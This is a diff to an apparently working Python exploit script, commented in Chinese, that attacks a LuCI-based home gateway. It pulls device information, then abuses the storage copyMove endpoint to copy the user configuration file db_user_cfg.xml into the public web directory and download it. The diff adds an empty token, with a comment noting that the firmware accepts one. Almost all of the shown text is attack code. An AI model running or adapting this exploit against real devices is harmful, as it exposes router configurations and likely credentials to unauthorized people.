@@ -19,7 +19,7 @@ def unPack(f: BytesIO):
         next_offset = int.from_bytes(f.read(4), byteorder='big')
         # 解压数据块的数据
         data = f.read(block_size)
-        unpacked_bytes += zlib.decompress(data)  # return decompress byteswap   
+        unpacked_bytes += zlib.decompress(data)  # return decompress byteswap
     return unpacked_bytes
 
 
@@ -29,6 +29,7 @@ Host = "http://192.168.1.1"
 UrlLogin = Host + "/cgi-bin/luci"
 UrlGetToken = Host + "/cgi-bin/luci/"
 UrlGetDevInfo = Host + "/cgi-bin/luci/admin/settings/gwinfo?get=all"
+UrlTokenPage = Host + "/cgi-bin/luci/admin/storage/settings"
 UrlExploit = Host + "/cgi-bin/luci/admin/storage/copyMove"
 UrlDownCfg = Host + ":8080/db_user_cfg.xml"
 UrlDeleteFile = Host + "/cgi-bin/luci/admin/storage/deleteFiles"
@@ -59,8 +60,17 @@ print('产品序列号:', dev_info['ProductSN'])
 print('软件版本号:', dev_info['SWVer'])
 print('MAC地址:   ', dev_info['MAC'], '\n')
 
+# 获取 token 值
+# 当前版本疑似存在 bug， 传入空 token 也可以成功
+# r = session.get(UrlGetToken)
+# html_str = r.text
+
 # 将配置文件复制到httpd的目录下
-payload = {'opstr': 'copy|//userconfig/cfg|/home/httpd/public|db_user_cfg.xml', 'fileLists': 'db_user_cfg.xml/'}
+payload = {
+    'opstr': 'copy|/userconfig/cfg|/home/httpd/public|db_user_cfg.xml',
+    'fileLists': 'db_user_cfg.xml/',
+    'token': ''
+}
 r = session.get(UrlExploit, params=payload)
 
 # 从httpd目录下载文件
